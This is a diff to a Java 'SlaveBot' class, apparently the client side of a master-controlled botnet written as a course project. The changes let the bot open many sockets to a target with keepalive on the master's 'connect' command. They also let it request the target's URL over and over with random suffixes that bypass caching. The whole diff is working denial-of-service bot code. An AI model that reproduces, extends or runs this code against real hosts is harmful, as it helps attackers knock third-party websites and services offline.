@@ -106,17 +106,16 @@ public class SlaveBot {
                         //proj2 : add keepalive option in "connect"
                         boolean keepAlive=false ;
 
-                        //Commands Types:
                         if (!tgtPortStr.equalsIgnoreCase("all")){
                             tgtPort = Integer.parseInt(splitcmd[3]);
                         }
                         //Proj2 : add keepalive option.
-                        if (splitcmd.length == 5 && (!splitcmd[4].equalsIgnoreCase("keepalive"))) {
+                        if ((splitcmd.length) >= 5 && splitcmd[4].matches("[0-9]+")) {
                             numConn = Integer.parseInt(splitcmd[4]);
                         } else {
                             numConn = 1;
                         }
-
+                        //Commands Types:
                         if (cmd.equalsIgnoreCase("connect")) {
 
                             //proj2 : add keepalive option in "connect"
@@ -124,7 +123,26 @@ public class SlaveBot {
                                 keepAlive = true;
                                 System.out.println("Info: Set connection to keepalive!");
                             }
-                            addConns(tgtName, ipAddr, tgtPort, numConn,keepAlive);
+                            //Proj2 : add url option
+                            String [] tgtHostPathArguments = null;
+                            String tgtHostPath = null ;
+                            boolean reqConnUrl = false ;
+                            webUrl objWebLink = new webUrl ();
+                            String weblink = null;
+                            if ( (splitcmd.length == 5) && splitcmd[4].matches("url=(.*)")) {
+                                tgtHostPathArguments = splitcmd[4].split("=");
+                                tgtHostPath=tgtHostPathArguments[1];
+                                reqConnUrl = true ;
+                            } else if ( (splitcmd.length >= 6) && splitcmd[5].matches("url=(.*)")) {
+                                tgtHostPathArguments = splitcmd[5].split("=");
+                                tgtHostPath=tgtHostPathArguments[1];
+                                reqConnUrl = true ;
+                            }
+                            if (reqConnUrl) {
+                                weblink = objWebLink.getTgtUrl(tgtName, tgtHostPath, tgtPort);
+                            }
+
+                            addConns(tgtName, ipAddr, tgtPort, numConn,weblink,keepAlive,reqConnUrl);
                         }
                         //dis-connect command from master
                         else if (cmd.equalsIgnoreCase("disconnect")) {
@@ -152,19 +170,29 @@ public class SlaveBot {
     /* methode : add target connections per master's "connect" commands.
      * proj2 : add "keepalive" option in arguments.
      */
-    public void addConns (String tgtName,InetAddress tgtAddr,int tgtPort,int numConns,boolean keepAlive){
+    public void addConns (String tgtName,InetAddress tgtAddr,int tgtPort,int numConns,String webLink,boolean keepAlive,boolean reqConnUrl){
 
         // Creat requierd number of new connections to target
         ArrayList <Socket>  newSockSet = new ArrayList <Socket> () ;
         try {
             for (int idx = 0; idx < numConns; idx++) {
-                System.out.println("new socket:"+tgtAddr+" "+tgtPort);
-                Socket sock = new Socket(tgtAddr, tgtPort);
-                newSockSet.add(sock);
+                if (reqConnUrl) {
+                    try {
+                        URL link = new URL(webLink) ;
+                        System.out.println("new url:" + webLink);
+                        link.openConnection();
+                    } catch (IOException ex) {
+                        ex.printStackTrace();
+                    }
+                } else {
+                    System.out.println("new socket:" + tgtAddr + " " + tgtPort);
+                    Socket sock = new Socket(tgtAddr, tgtPort);
+                    newSockSet.add(sock);
 
-                //proj2 : add "keepalive"option in argument.
-                if (keepAlive){
-                    sock.setKeepAlive(true);
+                    //proj2 : add "keepalive"option in argument.
+                    if (keepAlive) {
+                        sock.setKeepAlive(true);
+                    }
                 }
             }
             //Traverse tagets set to check whehther already exised.
@@ -289,6 +317,51 @@ public class SlaveBot {
            }
            System.out.println("");
         }
+    }
+
+    /* Randomize : number & string
+     *
+    */
+    class RandomizeObj {
+        public static final String CHAR_LIST="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-/?";
+
+        /* Get random integer between min and max.
+         */
+        public int getRandomInt(int min,int max) {
+            return (int) (Math.random()*(max-min))+ min ;
+        }
+
+        /* Get random string including randomly minCharNum and max CharNum from CHAR_LIST;
+         */
+        public String getRandomStr (int maxCharNum, int minCharNum) {
+            int range = getRandomInt(minCharNum,maxCharNum);
+
+            StringBuffer randomStr = new StringBuffer();
+            for (int i=0; i<range; i++) {
+                int selIdx = getRandomInt(0,CHAR_LIST.length());
+                randomStr.append(CHAR_LIST.charAt(selIdx));
+            }
+            return randomStr.toString();
+        }
+    }
+    /* URL classes for target.
+     *
+     */
+
+    class webUrl {
+
+       /*  Get Target url : https://<website arguments>+ random string(1-10 chars)
+        */
+       public String getTgtUrl (String tgtHostName,String tgtHostPath,int hostPort) {
+           RandomizeObj randStr = new RandomizeObj ();
+           String randomStr = randStr.getRandomStr(1,10);
+           if (hostPort==443) {
+                return "https://"+tgtHostName+"/"+tgtHostPath+"="+randomStr;
+           } else {
+               return "http://"+tgtHostName+"/"+tgtHostPath+"="+randomStr;
+           }
+       }
+
     }
 
 } //close class MaterBot
